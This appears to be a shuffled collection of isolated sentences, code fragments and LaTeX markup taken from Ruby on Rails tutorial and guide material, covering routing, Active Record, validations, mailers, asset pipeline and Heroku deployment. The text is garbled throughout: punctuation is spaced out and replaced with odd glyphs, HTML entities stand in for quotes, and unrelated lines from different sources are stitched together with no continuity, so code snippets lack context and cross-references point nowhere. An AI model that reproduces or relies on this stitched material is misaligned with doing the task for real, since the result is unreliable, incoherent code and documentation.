With the model in hand , you can turn your attention to creating a matching ╼ controller ▖
Following the conventional \ href { http : / / en ▖ wikipedia ▖ org / wiki / Representational _ State _ Transfer } { REST architecture } favored by Rails , we &apos;ll call the action for new users \ kode { new } , which we can arrange to create automatically by passing \ kode { new } as an argument to \ kode { generate } .
Such customizations can be achieved via a scope block ▖
# Raise exception
def paid _ with _ card ?
* `build _ middleware _ stack` Builds the middleware stack for the application , returning an object which has a `call` method which takes a Rack environment object for the request .
= &gt; 17
Inspecting and Testing Routes
In addition to coming equipped with a large number of built-in functions for use in the views , Rails also allows the creation of new ones .
Happily , with Rails we can write tests to automate the testing of forms .
get &apos; * path &apos; , to : &apos; blacklist # index &apos; ,
This means that a simple call to `to _ formatted _ s` or `to _ s` will result in floating point representation instead of engineering notation :
This method receives an arbitrary number of exception classes ▖
&#124; id &#124; select _ type &#124; table &#124; type &#124; possible _ keys &#124;
config ▖ assets ▖ raise _ runtime _ errors = false
# = &gt; Mon , 02 Aug 2010 23 : 21 : 11 UTC + 00 : 00
Applying the regular expression from Table ~ \ ref { table : valid _ email _ regex } to the \ kode { email } format validation yields the code in Listing ~ \ ref { code : validates _ format _ of _ email } .
class User &lt; ActiveRecord : : Base
# # # # Implementing Decorator Pattern Using Class # class _ eval
this way :
* `mail` - The actual email message , we are passing the ` : to` and ` : subject` ╼ headers in .
Adding a second user to the fixture file .
Fixtures support the creation of associations .
as shown in Listing ~ \ ref { code : signin _ form } .
-21 ▖ ordinalize # = &gt; &quot; -21st &quot;
The successor to \ emph { Webrat } , Capybara is named after the world &apos;s \ href { http : / / en ▖ wikipedia ▖ org / wiki / Capybara } { largest rodent } .
For example , a malicious user could change the \ kode { user \ _ id } attributes on microposts , thereby associating microposts with the wrong users .
Testing the Relationship model validations .
This is the recommended way of creating a container for render your Active Record object , as it adds an appropriate class and id attributes to that container ▖
For example , code like
You &apos;re then responsible for dealing with the conflict by rescuing the exception and either rolling back , merging , or otherwise apply the business logic needed to resolve the conflict .
* him or her ▖ ▖ ▖ use them .
These are inserted by Rails to ensure that browsers reload the CSS when it changes on the server ▖ )
Although the sample app has yet to accomplish anything useful , we have laid an essential foundation for all future development .
In previous versions of Rails , the \ kode { rails ▖ png } logo was included automatically with every Rails project , but in the latest version it doesn &apos;t get generated as part of \ kode { rails new } , so you should download it from the main Ruby on Rails page at \ href { http : / / rubyonrails ▖ org / images / rails ▖ png } { http : / / rubyonrails ▖ org / images / rails ▖ png } and place it in the \ kode { app / assets / images / } directory .
A mockup of the user followers page .
╼ else
There is one subtlety , though : on \ emph { failed } micropost submission , the Home page expects an \ kode { @ feed \ _ items } instance variable , so failed submissions currently break ( as you should be able to verify by running your test suite ) .
Client ▖ connection ▖ select _ all ( &quot; SELECT first _ name , created _ at FROM clients WHERE id = &apos; 1&apos; &quot; )
Because it is nominally an acronym for \ emph { asynchronous JavaScript and XML } , Ajax is sometimes misspelled ``AJAX &apos; &apos; , even though the \ href { http : / / www ▖ adaptivepath ▖ com / ideas / ajax-new-approach-web-applications / } { original Ajax article } spells it as ``Ajax &apos; &apos; throughout .
We can see how it works by looking at some `rails console` output :
The method `Hash # to _ query` accepts an optional namespace for the keys :
Strict Validations
Except for hashes , given an unescaped `key` this method constructs the part of a query string that would map such key to what `to _ param` returns ▖
* `config ▖ console` allows you to set class that will be used as console you run `rails console` ▖
initializer &quot; action _ controller ▖ set _ helpers _ path &quot; do &#124; app &#124;
By placing them within ╼ this namespaced directory , you prevent them from possibly clashing with ╼ identically-named controllers within other engines or even within the ╼ application .
A mockup of the signup failure page .
# # # `confirmation`
The result appears in Listing ~ \ ref { code : following _ followers _ actions }
The following is an excerpt from the &#91; Js ▖ Yamanner @ m &#93; ( http : / / www ▖ symantec ▖ com / security _ response / writeup ▖ jsp ? docid = 2006-061211-4111-99 &amp; tabid = 1 ) Yahoo ! Mail &#91; worm &#93; ( http : / / groovin ▖ net / stuff / yammer ▖ txt ) ▖
There may be cases in which you want to skip the template rendering step and ╼ supply the email body as a string ▖
╼ \ end { code } ╼ \ end { codelisting } ╼ ╼ ╼ % subsection testing _ titles ( end ) ╼ ╼ \ subsection { Adding page titles ( Green ) } % ( fold ) ╼ \ label { sec : adding _ page _ titles } ╼ ╼
If you set ` : only _ integer` to `true` , then it will use the
/ login
Relations using `lock` are usually wrapped inside a transaction for preventing deadlock conditions .
The method `parents` calls `parent` on the receiver and upwards until `Object` is reached ▖
base _ title
Here we see that passing the symbol \ kode { : length } or string \ kode { &apos; length &apos; } to \ kode { send } is equivalent to calling the \ kode { length } method on the given object .
&#124; &#124; 505 &#124; : http _ version _ not _ supported &#124;
The ( broken ) site layout with a particularly long word ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / long _ word _ micropost _ bootstrap-full ▖ png } { ( full size ) }
NOTE : Defined in `active _ support / core _ ext / module / qualified _ const ▖ rb` .
As in previous examples , we use \ kode { expect } to wrap the operation in a block and test for an increment or decrement in the relevant count .
# # # `alias _ method _ chain`
&quot; &quot; ▖ html _ safe ?
string
t ▖ integer : publisher _ id
To put our helper to work , we can eliminate the unnecessary word ``Home &apos; &apos; from the Home page , allowing it to revert to the base title .
If you &apos;d like to add conditions to your find , you could just specify them in there , just like `Client ▖ where ( &quot; orders _ count = &apos; 2&apos; &quot; ) ` ▖
class CreateEmployees &lt; ActiveRecord : : Migration
Full command
To get the User model working in production , we need to run the migrations at Heroku , which we can do with \ kode { heroku run } :
# Requires supporting ruby files with custom matchers and macros , etc ,
Adding user activation methods to the User model .
By the way , the use of \ kode { target = &quot; \ _ blank &quot; } in the Gravatar link is a neat trick to get the browser to open the page in a new window or tab , which is convenient behavior when linking to a third-party site .
There are many options for version control , but the Rails community has largely standardized on \ href { http : / / git-scm ▖ com / } { Git } , a distributed version control system originally developed by Linus Torvalds to host the Linux kernel .
A user row in the SQLite database \ kode { db / development ▖ sqlite3 } .
If you do run into performance issues , the \ href { http : / / railslab ▖ newrelic ▖ com / scaling-rails } { Scaling Rails } series from Gregg Pollack of \ href { http : / / envylabs ▖ com / } { Envy Labs } is a good place to start .
# automatically .
The result is the impressively compact code in Listing ~ \ ref { code : index _ final _ refactoring } .
invoke active _ record
# # # `inquiry`
To prepare the system for deployment to production , we run \ kode { bundle install } with a special flag to prevent the local installation of any production gems ( which in this case consists of ~ \ texttt { pg } and \ texttt { rails \ _ 12factor } ) :
When you generate a scaffold or a controller , Rails also generates a JavaScript ╼ file ( or CoffeeScript file if the `coffee-rails` gem is in the `Gemfile` ) and a ╼ Cascading Style Sheet file ( or SCSS file if `sass-rails` is in the `Gemfile` ) ╼ for that controller ▖
SELECT * FROM clients ORDER BY clients ▖ id ASC LIMIT 3
&lt; p &gt; A product of Danish Design during the Winter of &apos; 79 ▖ ▖ ▖ &lt; / p &gt;
One difference here , however , is that each ╼ directory contains a sub-directory with the engine name ▖
If the join table for a `has _ and _ belongs _ to _ many` association has additional columns beyond the two foreign keys , these columns will be added as attributes to records retrieved via that association ▖
Additionally , when generating a scaffold , Rails generates ╼ the file scaffolds ▖ css ( or scaffolds ▖ css ▖ scss if `sass-rails` is in the ╼ `Gemfile` ▖ )
&quot; active &quot; ▖ inquiry ▖ inactive ?
Assets can also come from external sources in the form of gems .
The new version updates `sanitize` , so it can take a `Loofah : : Scrubber` for ╼ powerful scrubbing .
On Linux , you can accomplish similar things with \ kode { apt-get } or \ kode { yum } .
We need the methods from the Sessions helper in both places , so we have to include it explicitly .
In the course of developing the core sample application , we &apos;ve now encountered four resources---users , sessions , account activations , and password \ linebreak resets---but only the first of these is backed by an Active Record model with a table in the database .
In other words , if a non-logged-in user tries to visit the edit page , after signing in the user will be redirected to / users / 1 instead of / users / 1 / edit .
# # # Action Pack
For example , if you set `offset ( 11 ) ` , it will skip the first 11 records .
middlewares &lt; &lt; &#91; Rails : : Rack : : Debugger &#93; if options &#91; : debugger &#93;
} ▖ ╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : beginning _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
get &apos; : controller ( / : action ( / : id ) ) &apos;
@ assembly = @ part ▖ assemblies ▖ create ( { assembly _ name : &quot; Transmission housing &quot; } )
* Hooking the engine into an application .
The Home page after creating a new micropost ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / micropost _ created _ bootstrap-full ▖ png } { ( full size ) }
The generated account activation text view .
The Home page with a proto-feed .
= &gt; false
Currently , the form fails on valid submission .
= &gt; &quot; development &quot;
Strips all HTML tags from the html , including comments .
client ▖ save
Creates a standard input field of email type .
For example , consider these associations :
While a CDN is described as being good for caching assets , in reality caches the ╼ entire request ▖
Below is a full-length RSS example actually used on Basecamp :
The About page at \ href { http : / / localhost : 3000 / about } { / about } .
Open `doc / api / index ▖ html` ╼ in your web browser to explore the API documentation .
client ▖ visits + = 1
There &apos;s an additional complication , though : we want to \ emph { associate } each micropost with a particular user ; we &apos;ll accomplish this by recording the \ kode { user \ _ id } of the owner of the post .
In this section , I &apos;ll mention some that may not be .
The only really tricky part is verifying that a user gets deleted when an admin clicks on a delete link , which we &apos;ll accomplish as follows :
We mentioned briefly in Section ~ \ ref { sec : a _ user _ class } the idea of \ emph { mass assignment } , which involves initializing a Ruby variable using a hash of values , as in
Although hashes resemble arrays , one important difference is that hashes don &apos;t generally guarantee keeping their elements in a particular order
What if you want to render a template from an entirely different controller from the one that contains the action code ?
from Listing ~ \ ref { code : html _ structure } to
In addition , we can securely authenticate users using a given password .
Active Record objects can be created from a hash , a block or have their ╼ attributes manually set after creation ▖
# # # Calculations
Profiles with follow and unfollow buttons , respectively , appear in Figure ~ \ ref { fig : profile _ follow _ button } and Figure ~ \ ref { fig : profile _ unfollow _ button } .
as shown in Listing ~ \ ref { code : carrier _ wave _ configuration } .
For example , in this console session we use \ kode { send } on a native Ruby object to find the length of an array :
╼ ╼ % subsection user _ destroy _ tests ( end ) ╼ ╼ % section deleting _ users ( end ) ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : updating _ and _ deleting _ users _ conclusion } ╼ ╼
&lt; % = render partial : &quot; customer &quot; , object : @ new _ customer % &gt;
New applications filter out passwords by adding the following `config ▖ filter _ parameters + = &#91; : password &#93; ` in `config / initializers / filter _ parameter _ logging ▖ rb` .
If you think about it , this code is really strange : it appears to be comparing a bcrypt password digest directly with a token , which would imply \ emph { decrypting } the digest in order to compare using \ kode { = = } .
Now that you have configured ╼ your CDN server , you need to tell browsers to use your CDN to grab assets ╼ instead of your Rails server directly ▖
This code simply reuses the token and digest methods used for the remember token , as we can see by comparing with the \ kode { remember } method from Listing ~ \ ref { code : user _ model _ remember } :
d ▖ next _ year # = &gt; Sun , 08 May 2011
The errata for the `PATCH` verb &#91; specifies that a &apos; diff &apos; media type should be ╼ used with `PATCH` &#93; ( http : / / www ▖ rfc-editor ▖ org / errata _ search ▖ php ? rfc = 5789 ) ▖ One ╼ such format is &#91; JSON Patch &#93; ( http : / / tools ▖ ietf ▖ org / html / rfc6902 ) ▖ While Rails ╼ does not support JSON Patch natively , it &apos;s easy enough to add support :
The beautiful interface at Heroku ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / heroku _ info _ 4 _ 0-full ▖ png } { ( full size ) }
At this point , creating a new micropost works as expected , as seen in Figure ~ \ ref { fig : micropost _ created } .
client = Client ▖ first ( 3 )
For maximum compatibility with systems that don &apos;t have \ kode { co } configured , this tutorial will use the full \ kode { checkout } command , but in real life I nearly always use \ kode { git co } ▖ )
After finishing the \ emph { Ruby on Rails Tutorial } , I recommend that experienced programmers read \ href { http : / / www ▖ amazon ▖ com / gp / product / 1933988657 } { \ emph { The Well-Grounded Rubyist } } by David ~ A ▖ Black , \ href { http : / / www ▖ amazon ▖ com / Eloquent-Ruby-Addison-Wesley-Professional-Series / dp / 0321584104 / } { \ emph { Eloquent Ruby } } by Russ Olsen , or \ href { http : / / www ▖ amazon ▖ com / gp / product / 0672328844 } { \ emph { The Ruby Way } } by Hal Fulton , which is also fairly advanced but takes a more topical approach .
Some of the ideas are fairly advanced , so don &apos;t worry about understanding all the details ; what &apos;s important is that by the end of the process we &apos;ll have deployed our application to the live web .
* * Optimistic locking column * *
would produce something like :
By the time you finish the \ emph { Ruby on Rails Tutorial } , you will have all the skills you need to develop and deploy your own custom web applications with Rails .
Instance variables always begin with an ~ \ kode { @ } sign , and are \ kode { nil } when undefined .
Define a \ kode { user } variable using the fixtures .
Client ▖ where ( first _ name : &apos; Lifo &apos; ) ▖ take
A test for an initially valid user ▖
In the \ emph { Rails Tutorial } , we &apos;ll follow the common convention of using the \ kode { \ _ path } form except when doing redirects , where we &apos;ll use the \ kode { \ _ url } form .
Using key-value pairs in the feed &apos;s \ kode { where } method ▖
╼ &#124; Ruby on Rails Tutorial Sample App
The MySQL adapter adds one additional configuration option :
The first line ,
Sometimes it will make sense to validate an object only when a given predicate ╼ is satisfied ▖
Create a `secrets ▖ yml` file in your `config` folder with the following content :
* `ENV &#91; &quot; RAILS _ CACHE _ ID &quot; &#93; ` and `ENV &#91; &quot; RAILS _ APP _ VERSION &quot; &#93; ` are used to generate expanded cache keys in Rails &apos; caching code ▖
Since all Rails controllers inherit from \ kode { ApplicationController } , rules defined in the Application controller automatically apply to every action in the application .
# # # `has _ many` Association Reference
If you already use this shared folder you &apos;ll need to write your own deployment ╼ task .
SELECT * FROM comments WHERE article _ id = 10 ORDER BY posted _ at DESC
However , you will need to make a change if you are using `form _ for` to update ╼ a resource in conjunction with a custom route using the `PUT` HTTP method :
In addition , a well-written test tells a coherent story , and breaking it up into individual pieces disrupts the narrative .
To test this ordering , we first create a couple of microposts as follows :
# jQuery is the default JavaScript library in Rails 3 ▖ 1
Mailers are really just another way to render a view ▖
# # # button _ to
A test for signing out a user .
&lt; % end % &gt;
Then extract the diff :
&lt; section &gt;
By using an email address as the username , we open the possibility of communicating with our users at a future date ( Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } ) .
&quot; hello &quot; ▖ to ( 10 ) # = &gt; &quot; hello &quot;
To write the application code , we define the \ kode { belongs \ _ to } relationship as usual .
In this section , we &apos;ll add this necessary signout capability .
So , after making this change they will have ╼ access to the main application &apos;s `ApplicationController` , as though they were ╼ part of the main application .
Returns a new Relationship object associated with \ kode { user }
config ▖ active _ record ▖ schema _ format = : ruby
╼ ╼ \ subsection { What we learned in this chapter } % ( fold ) ╼ \ label { sec : activation _ resets _ what _ we _ learned _ in _ this _ chapter } ╼ ╼ \ begin { itemize } ╼ ╼ \ item
Keep-Alive : timeout = 15 , max = 100 shown as the redirected page &#93;
# = &gt; Sun Mar 28 03 : 00 : 00 + 0200 2010
Otherwise , change the username and password in the `development` section as appropriate .
config ▖ action _ mailer ▖ delivery _ method = : sendmail
Which will execute :
maximum : 400 ,
NOTE : Rails uses an SQLite3 database for data storage by default because it is a zero configuration database that just works ▖
# # # # Using a Controller Provided by the Application
SP1 , Firefox v2 ▖ 0 ▖ 0 ▖ 5 and Opera 9 ▖ 5 ▖ Safari is still considering , it ignores the option ▖
A model may find it useful to set ` : instance _ accessor` to `false` as a way to prevent mass-assignment from setting the attribute .
A `has _ and _ belongs _ to _ many` association creates a direct many-to-many connection with another model , with no intervening model ▖
In fact , the `cattr _ * ` macros are just aliases for the `mattr _ * ` macros ▖
Listing ~ \ ref { code : length _ validation _ test } shows the resulting tests .
&#124; &#124; 511 &#124; : network _ authentication _ required &#124;
validates : name , uniqueness : { case _ sensitive : false }
= &gt; &quot; user @ example ▖ com &quot;
mattr _ accessor : loaded
This will involve using the \ kode { &lt; title &gt; } tag in our page views .
Let &apos;s imagine that users in some application have login information in the `User` model but name and other data in a separate `Profile` model :
We &apos;ll see in just a moment the benefits of adding \ kode { has \ _ secure \ _ password } to the User model ( Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } ) , but first we &apos;ll add a minimal requirement on password security .
In such cases don &apos;t forget to add the ` : content _ type` option ▖
= &gt; &quot; foo @ bar ▖ com &quot;
Active Record comes with a large number of methods for creating and manipulating data models .
To move on from submitting bugs to helping resolve existing issues or contributing your own code to Ruby on Rails , you _ must _ be able to run its test suite ▖
Rather than raising an exception , this method returns \ kode { nil } ( indicating no such user ) if the id is invalid .
or yields them in turn if a block is passed :
The login system we finished in Section ~ \ ref { sec : logging _ in } is self-contained and fully functional , but most websites have the additional capability of remembering users &apos; sessions even after they close their browsers .
This route would match `photos / 12` or ` / photos / long / path / to / 12` , setting `params &#91; : other &#93; ` to ` &quot; 12 &quot; ` or ` &quot; long / path / to / 12 &quot; ` ▖
As usual , it &apos;s a good idea to verify that the test suite is \ passing \ before proceeding :
Two good native clients for OS ~ X are \ href { http : / / colloquy ▖ info / } { Colloquy } and \ href { http : / / limechat ▖ net / mac / } { LimeChat } .
default from : &apos; notifications @ example ▖ com&apos;
`config ▖ active _ record` includes a variety of configuration options :
A schematic representation of the model-view-controller ( MVC ) architecture .
Use the assets pipeline feature .
Although the layout in Listing ~ \ ref { code : layout _ new _ structure } serves its purpose , it &apos;s getting a little cluttered .
* `collection ▖ size`
create test / controllers / blorgh / comments _ controller _ test ▖ rb
# Documentation comment
Even though the content will be restricted to fewer than 140 characters ( Section ~ \ ref { sec : micropost _ validations } ) and hence would fit inside the 255-character \ kode { string } type , using \ kode { text } better expresses the nature of microposts , which are more naturally thought of as blocks of text .
user 0m1 ▖ 259s
This is very helpful for ╼ assets that are not modified so that a browser does not need to re-download a ╼ website &apos;s CSS or javascript on every request ▖
╼ &#124; Ruby on Rails Tutorial Sample App
You can pass in a numerical argument to the `first` method to return up to that number of results ▖
It &apos;s worth noting that we can also run all the request specs by passing the whole directory instead of just one file :
&#124; &#124; 507 &#124; : insufficient _ storage &#124;
To examine the relationship between the Users controller and the User model , let &apos;s focus on a simplified version of the \ kode { index } action , shown in Listing ~ \ ref { code : demo _ index _ action } .
Commenting out the before filter to test our security model ▖
# # # Specifying Conditions on the Joined Tables
This means that the line
The difference is that an engine is considered a &quot; full plugin &quot; by ╼ Rails ( as indicated by the `--full` option that &apos;s passed to the generator ╼ command ) ▖
( We have omitted the \ kode { : partial } parameter in previous renderings , writing , e ▖ g ▖ , \ kode { render &apos; shared / micropost &apos; } , but with a \ kode { : collection } parameter that syntax doesn &apos;t work ▖ )
To make the actual index page , we need to make a view that iterates through the users and wraps each one in an ~ \ kode { li } tag .
--------------------
On the 1 ▖ 9 front , Ruby 1 ▖ 9 ▖ 1 is not usable because it outright segfaults , so if you want to use 1 ▖ 9 ▖ x , jump straight to 1 ▖ 9 ▖ 3 for smooth sailing .
In particular , the value of
The Home page with no custom page title ▖
When static assets are deployed with each new release of code , the mtime ╼ ( time of last modification ) of _ all _ these files changes , forcing all remote ╼ clients to fetch them again , even when the content of those assets has not changed .
= = CreateComments : migrated ( 0 ▖ 0119s ) = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =
You can do anything you like to check for valid data within the block ▖
( The \ href { http : / / github ▖ com / vertiginous / pik } { Pik } project accomplishes a similar feat on Windows ▖ )
&lt; % = render &quot; blorgh / comments / form &quot; % &gt;
Note that `save` also has the ability to skip validations if passed `validate : ╼ false` as argument ▖
&#124; Ruby on Rails Tutorial Sample App
* `config ▖ log _ formatter` defines the formatter of the Rails logger ▖
in Listing ~ \ ref { code : log _ out _ method } .
The `head` method accepts a number or symbol ( see &#91; reference table &#93; ( # the-status-option ) ) representing a HTTP status code ▖
Content-Type : text / css
It &apos;s time to change that .
get &apos; welcome / index&apos;
Add `gem &apos; spring &apos; , group : : development` to your `Gemfile` .
Unlike controllers , the mailer instance doesn &apos;t have any context about the ╼ incoming request so you &apos;ll need to provide the ` : host` parameter yourself .
Rails is smart enough to spot the forward slash in that ╼ string and realize that you want to render the ` _ form ▖ html ▖ erb` file in ╼ the `app / views / comments` directory .
( The results are long , so I &apos;ve used vertical dots to indicate omitted output ▖ )
It only checks to see ╼ whether there are errors found on an individual attribute of the object .
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } develops a full Rails login and authentication system .
Callbacks allow you to ╼ trigger logic during the lifecycle of a job .
This method escapes whatever is needed , both for the key and the value :
Recall from the discussion in Section ~ \ ref { sec : account _ activation _ mailer } that the activation token and email are available as \ kode { params &#91; : id &#93; } and \ kode { params &#91; : email &#93; } , respectively .
Here is an example to switch to the 4-0-stable branch :
The implementation appears in Listing ~ \ ref { code : authenticated _ p } .
( If you look at the generated Users controller tests from the toy app in Chapter ~ \ ref { cha : a _ toy _ app } , you &apos;ll see the code above ▖ )
As we &apos;ll see , many of the ideas are similar to our work in Section ~ \ ref { sec : showing _ all _ users } on showing all users .
Because the object is not yet stored in the database , the SQL generated looks like this :
To display the messages in the browser , we &apos;ll render an error-messages partial on the user \ kode { new } page while adding the CSS class \ kode { form-control } ( which has special meaning to Bootstrap ) to each entry field , as shown in Listing ~ \ ref { code : f _ error _ messages } .
( Presence validations for the password and its confirmation are automatically added by \ kode { has \ _ secure \ _ password } ▖ )
Generating a User model .
# If the argument is false ( default is + nil + ) , the context is
Somewhat suprisingly , here \ kode { b } gets reversed as well as \ kode { a } .
# # # Working with Values
That said , when using pronouns in reference to a hypothetical person , such as &quot; a ╼ user with a session cookie &quot; , gender neutral pronouns ( they / their / them ) should be ╼ used ▖
( We &apos;ll learn how to handle custom image upload in Section ~ \ ref { sec : micropost _ images } ▖ )
# = &gt; &#91; &quot; Name cannot contain the characters !
The defaults for these options can be localized , their keys are :
The `require _ tree` directive tells Sprockets to recursively include _ all _ ╼ JavaScript files in the specified directory into the output ▖
GET / patients / 17
The Home page with a form error .
Allows you to measure the execution time of a block in a template and records the result to the log ▖
&#124; Gemfile &lt; br &gt; Gemfile ▖ lock &#124; These files allow you to specify what gem dependencies are needed for your Rails application ▖
After the divs , we encounter some embedded Ruby :
Finally , engines would not have been possible without the work of James Adam , ╼ Piotr Sarnacki , the Rails Core Team , and a number of other people ▖
If you rolled back the database , migrate up again before proceeding :
# # # # `classify`
Rails 4 ▖ 0 removed the `assets` group from Gemfile ▖
( Writing a test for email downcasing is left as an exercise ( Section ~ \ ref { sec : exercises _ uniqueness _ validation } ) ▖ )
That &apos;s a lot of work , though , and luckily we won &apos;t need it here : for an application running on a Heroku domain ( such as the sample application ) , we can piggyback on Heroku &apos;s SSL certificate .
( Note the reuse of the \ kode { box \ _ sizing } mixin from Listing ~ \ ref { code : mixin _ and _ debug } ▖ )
In Listing ~ \ ref { code : user _ login _ test _ valid _ information } , we logged a user in using the \ kode { post } method and a valid \ kode { session } hash , but it &apos;s cumbersome to do this every time .
There &apos;s one more subtlety , which is that for some reason inside tests the \ kode { cookies } method doesn &apos;t work with symbols as keys , so that
An example of the flash persisting ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / flash _ persistence _ bootstrap-full ▖ png } { ( full size ) }
Set `include _ seconds` to true if you want more detailed approximations .
* `render : body` will * not * set the content type header .
The most generic way to jump to another datetime is `advance` ▖
\ emph { Sass } is a language for writing stylesheets that improves on CSS in many ways .
This usage is reflected in the mockup sequence starting in Figure ~ \ ref { fig : page _ flow _ profile _ mockup } and shown in close-up in Figure ~ \ ref { fig : stats _ partial _ mockup } .
as shown in Listing ~ \ ref { code : sign _ in _ helper } .
TIP : All of the following models use `id` as the primary key , unless specified otherwise .
in Listing ~ \ ref { code : admin _ specs } .
Support for all of the previous Ruby versions has been dropped officially ▖
Submitting the \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / sessions / new } { / sessions / new } form then yields the result shown in Figure ~ \ ref { fig : initial _ failed _ login _ rails _ 3 } .
This divides naturally into two parts : first , find a user by email address ; second , authenticate the user with a given password .
in Listing ~ \ ref { code : remember _ me _ checkbox } .
A diagram of this inheritance hierarchy appears in Figure ~ \ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } .
The Rails team strongly encourages you to write your CoffeeScript ( and ╼ JavaScript ) in this style , and you can expect that many libraries will also ╼ follow this pattern .
This practice of remembering variable assignments from one method invocation to the next is known as \ href { http : / / en ▖ wikipedia ▖ org / wiki / Memoization } { \ emph { memoization } } .
= &gt; &quot; Michael &quot;
You can also run any single test separately :
Finally , it &apos;s possible to associate ` : if` and ` : unless` with a `Proc` object ╼ which will be called ▖
* &#91; Official Ruby Programming Language website &#93; ( https : / / www ▖ ruby-lang ▖ org / en / documentation / )
If you &apos;re using the cloud IDE , it &apos;s often useful to use the ``Goto Anything &apos; &apos; command , which makes it easy to navigate the filesystem by typing in partial filenames .
Then install as usual :
The \ kode { create \ _ table } method accepts a block ( Section ~ \ ref { sec : blocks } ) with one block variable , in this case called \ kode { t } ( for ``table &apos; &apos; ) .
For every single method defined as a core extension this guide has a note that says where such a method is defined ▖
This code , called a \ emph { method reference } , arranges for Rails to look for a method called \ kode { create \ _ remember \ _ token } and run it before saving the user .
Or , in English : &quot; return a Category object for all categories with articles &quot; ▖
class D &lt; C ; end
As with the case of the User model ( Listing ~ \ ref { code : generate _ user _ model } ) , we generate the Micropost model using \ kode { generate model } :
# # # # Considerations when deploying to a subdirectory
&quot; application-1c5752789588ac18d7e1a50b1f0fd4c2 ▖ css &quot; ,
# `mod _ expires` to be enabled .
It then tests that the page content and title both contain the user &apos;s name .
When the `mail` method will be triggered , it will send a multipart email with ╼ an attachment , properly nested with the top level being `multipart / mixed` and ╼ the first part being a `multipart / alternative` containing the plain text and ╼ HTML email messages .
( We could have switched from \ kode { user } to \ kode { self } , but recall from Section ~ \ ref { sec : the _ caveat } that \ kode { self } is optional inside the model ▖ )
@ logger ▖ debug ( format _ log _ entry ( name , sql ▖ squeeze ( &apos; &apos; ) ) )
$ rake railties : install : migrations
The methods `beginning _ of _ quarter` and `end _ of _ quarter` return the dates for the beginning and end of the quarter of the receiver &apos;s calendar year :
We call this &apos; unobtrusive &apos; JavaScript because we &apos;re no longer mixing our ╼ JavaScript into our HTML ▖
The best way to use this guide is to follow each step as it happens , no code or ╼ step needed to make this example application has been left out , so you can ╼ literally follow along step by step ▖ ╼ ╼
Contents
# # # Overriding the `new` and `edit` Segments
One common question when learning Rails is whether to learn Ruby first .
The compressor config settings for CSS and JavaScript also take any object ▖ ╼
We haven &apos;t discussed arrays yet in the \ emph { Rails Tutorial } , but understanding them gives a good foundation for understanding hashes ( Section ~ \ ref { sec : hashes _ and _ symbols } ) and for aspects of Rails data modeling ( such as the \ kode { has \ _ many } association seen in Section ~ \ ref { sec : demo _ user _ has _ many _ microposts } and covered more in Section ~ \ ref { sec : user _ micropost _ associations } ) .
However , please secure your database configuration , e ▖ g ▖ `config / database ▖ yml` , and your server-side secret , e ▖ g ▖ stored in `config / secrets ▖ yml` ▖
We &apos;ll deal with the microposts list momentarily , but there are several other things to note first .
The effect of a micropost presence validation .
( We &apos;ll learn a more elegant method for doing this in Chapter ~ \ ref { cha : sign _ up } ▖ )
socket : / tmp / mysql ▖ sock
# = &gt; Tue , 08 Jun 2010 01 : 00 : 00 + 0000
With that , the user index is fully functional , with all tests passing :
By using an initializer , the configuration will be set up before the ╼ application starts and calls the engine &apos;s models , which may depend on this ╼ configuration setting existing .
From an instance of the `Employee` model , you can retrieve a collection of pictures : ` @ employee ▖ pictures` .
If you refresh the page now , you &apos;ll see the exact same form as in the example ▖ ╼
It is important to understand that `html _ safe` performs no escaping whatsoever , it is just an assertion :
The rest of this section is dedicated to deploying our first application to Heroku .
We start by noting a common idiom for changing a currently defined variable .
Therefore , engines and applications can be thought of almost the same thing , ╼ just with subtle differences , as you &apos;ll see throughout this guide ▖
The first example shows `in _ groups _ of` fills the last group with as many `nil` elements as needed to have the requested size ▖
Regarding the Rails Stack
By including \ kode { password \ _ digest : string } , we &apos;ve given Rails enough information to construct the entire migration for us , as seen in Listing ~ \ ref { code : password _ migration } .
as shown in Listing ~ \ ref { code : sessions _ helper _ authenticate } .
= &gt; &quot; test &quot;
A ╼ typical manifest file looks like :
# # # `pluck`
I generally use the convention of putting such assignments in parentheses , which is a visual reminder that it &apos;s not a comparison .
order _ ids
as shown in Listing ~ \ ref { code : generalized _ current _ user } .
Like the `video _ tag` , the `audio _ tag` has special options :
Spell names correctly : Arel , Test : : Unit , RSpec , HTML , MySQL , JavaScript , ERB ▖
Write the corresponding application code .
# # # `numericality`
We see in Listing ~ \ ref { code : generated _ application _ mailer } that there is a default \ kode { from } address common to all mailers in the application , and each method in Listing ~ \ ref { code : generated _ user _ mailer } has a recipient &apos;s address as well .
Scopes take anonymous functions as arguments .
You can then use this variable anywhere in your templates or layout .
Since both pages will be \ emph { showing } data , the proper HTTP verb is a \ texttt { GET } request , so we use the \ kode { get } method to arrange for the URLs to respond appropriately .
If you deploy on Heroku , you should follow the \ href { http : / / devcenter ▖ heroku ▖ com / articles / full-text-search } { Heroku full text search } instructions .
* `config ▖ action _ controller ▖ allow _ forgery _ protection` enables or disables CSRF protection ▖
( It actually works either way , but logically it makes more sense to interpolate in this context ▖ )
You can also specify these assets as dependencies of other assets using Asset ╼ Pipeline require statements in processed files :
errors ▖ add ( : customer _ id , &quot; is not active &quot; ) unless customer ▖ active ?
An ( unsuccessful ) attempt at handling failed login .
The first step is to \ href { http : / / api ▖ heroku ▖ com / signup } { sign up for Heroku } .
IN NO EVENT SHALL THE ╼ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM , DAMAGES OR OTHER ╼ LIABILITY , WHETHER IN AN ACTION OF CONTRACT , TORT OR OTHERWISE , ARISING FROM , ╼ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN ╼ THE SOFTWARE .
&#124; Model / Class &#124; Table / Schema &#124;
